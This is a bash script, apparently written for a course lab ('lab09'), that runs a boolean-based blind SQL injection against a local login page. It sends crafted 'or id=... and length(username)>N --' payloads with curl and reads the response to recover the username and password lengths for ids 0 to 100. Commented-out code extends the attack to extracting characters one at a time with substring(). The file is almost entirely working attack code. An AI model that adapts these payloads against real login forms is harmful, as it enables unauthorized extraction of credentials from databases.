#!/bin/bash

for id in {0..100};
do
	username_len=0
	for (( ; ;))
	do
		addr="u=\" or id=$id and length(username)>$username_len -- "
		# echo "$addr"
		curl -s --data "$addr" http://localhost/lab09/login.php > result.html
		
		file=$(<result.html)
		substring="cat.JPG"

		if [[ $file =~ $substring ]];
		then
			((username_len++))
		else
			# echo "$username_len"
			break	
		fi
	done

	password_len=0
	for (( ; ;))
	do
		addr="u=\" or id=$id and length(password)>$password_len -- "
		# echo "$addr"
		curl -s --data "$addr" http://localhost/lab09/login.php > result.html
		
		file=$(<result.html)
		substring="cat.JPG"

		if [[ $file =~ $substring ]];
		then
			((password_len++))
		else
			# echo "$password_len"
			break	
		fi
	done

	echo "id=$id; username_len=$username_len; password_len=$password_len"
done




# for c in {33..126};
# do
# 	x=$(printf '%x' $c)
# 	echo "%$x"
# 	char=$(echo $x | xxd -r -p)
# 	echo "$char"
# done


# i=98
# while true; do
# 	addr="u=\" or id=$i and substring(username,1,1)=\"a\" -- "
	
# 	addr="u=\" or id=$i and length(username)>4 -- "
# 	curl -s --data "$addr" http://localhost/lab09/login.php > result.html

# 	file=$(<result.html)
# 	substring="cat.JPG"

# 	if [[ $file =~ $substring ]];
# 	then
# 		echo "admin"
# 		echo "$i"
# 		break	
# 	fi
# 	echo "it's not id $i"
# 	((i++))
# done